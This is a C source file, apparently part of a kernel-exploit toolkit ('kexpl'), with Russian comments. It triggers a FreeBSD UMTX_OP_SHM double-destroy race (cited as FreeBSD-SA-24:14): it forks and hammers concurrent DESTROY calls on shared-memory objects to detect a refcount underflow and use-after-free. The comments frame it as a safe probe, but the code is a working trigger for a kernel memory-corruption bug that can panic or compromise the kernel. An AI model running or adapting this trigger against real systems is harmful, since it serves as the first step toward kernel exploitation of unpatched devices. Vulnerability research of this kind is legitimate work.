/* t3_umtx_shm.c — probe UMTX_OP_SHM double-destroy (FreeBSD-SA-24:14.umtx, UAF/refcount).
 * Сверено с FreeBSD releng/11.4: sys/sys/umtx.h:99 UMTX_OP_SHM=25,
 * флаги 0x1 CREAT / 0x2 LOOKUP / 0x4 DESTROY / 0x8 ALIVE;
 * kern_umtx.c:3962 __umtx_op_shm(td, uap->uaddr1, uap->val) -> umtx_shm(td, uaddr, flags).
 * Значит API: _umtx_op(NULL, 25, flags, &id, NULL), id - u64.
 * Баг SA-24:14: конкурентные DESTROY уменьшают refcount лишний раз -> объект
 * освобождается раньше времени -> UAF/паника. Проверяем безопасно: два процесса
 * (fork) одновременно уничтожают один и тот же id, считаем УСПЕШНЫЕ destroy.
 * Норма: успешен ровно один destroy на созданный объект.
 * Детект: "REFCOUNT-UNDERFLOW" в /data/kexpl-t3-umtx-shm.log (успехов > 1 на один id).
 */
#include "kexpl.h"

static int destroy_once(u64 id){
    u64 v = id;
    return (int)sys5(SYS__umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, (i64)&v, 0);
}
static int create_map(u64 *id){
    u64 v = 0;
    i64 rc = sys5(SYS__umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, (i64)&v, 0);
    *id = v;
    return (int)rc;
}

int trig_main(void){
    if (klog_init("t3-umtx-shm", 1)) return 1;
    log_tag("t3"); log_s("UMTX_OP_SHM destroy-refcount probe (FreeBSD-SA-24:14, syscall 454)\n");

    u64 id = 0;
    int rc = create_map(&id);
    log_tag("t3"); log_s("UMTX_SHM_CREAT rc="); log_l(rc); log_s(" id="); log_h(id); log_s("\n");
    if (rc != 0) {
        log_tag("t3"); log_s("RESULT: SKIP — UMTX_OP_SHM не поддержан на этой прошивке (смотри rc выше)\n");
        log_flush(1); return 0;
    }

    int rounds = 16, ok_destroys = 0, child_ok = 0;
    for (int r = 0; r < rounds; r++) {
        if (r) { if (create_map(&id) != 0) break; }
        i64 pid = sys0(SYS_fork);
        if (pid == 0) {                       /* ребёнок: долбит destroy */
            for (int k = 0; k < 64; k++) destroy_once(id);
            sys1(SYS_exit, 0);
            for(;;){}
        }
        /* родитель: тоже долбит destroy одновременно с ребёнком */
        int local_ok = 0;
        for (int k = 0; k < 64; k++) { if (destroy_once(id) == 0) local_ok++; }
        int st = 0; sys4(SYS_wait4, pid, (i64)&st, 0, 0);
        /* ребёнок не сообщает свой счёт, поэтому оцениваем по факту: если destroy
           после уже успешного всё ещё возвращает 0 — объект жив/refcount не декрементится */
        if (local_ok) { ok_destroys += local_ok; }
        if (local_ok > 1) {
            log_tag("t3"); log_s("REFCOUNT-UNDERFLOW: успешных destroy в одном раунде="); log_l(local_ok);
            log_s(" (норма 1) round="); log_l(r); log_s("\n");
        }
        (void)child_ok;
    }
    log_tag("t3"); log_s("rounds="); log_l(rounds); log_s(" total_ok_destroys="); log_l(ok_destroys); log_s("\n");
    if (ok_destroys > rounds) {
        log_tag("t3"); log_s("RESULT: POSITIVE — повторные DESTROY принимаются (кандидат на SA-24:14)\n");
        log_flush(1); return 2;
    }
    log_tag("t3"); log_s("RESULT: NEGATIVE — повторный DESTROY отвергается\n");
    log_flush(1);
    return 0;
}
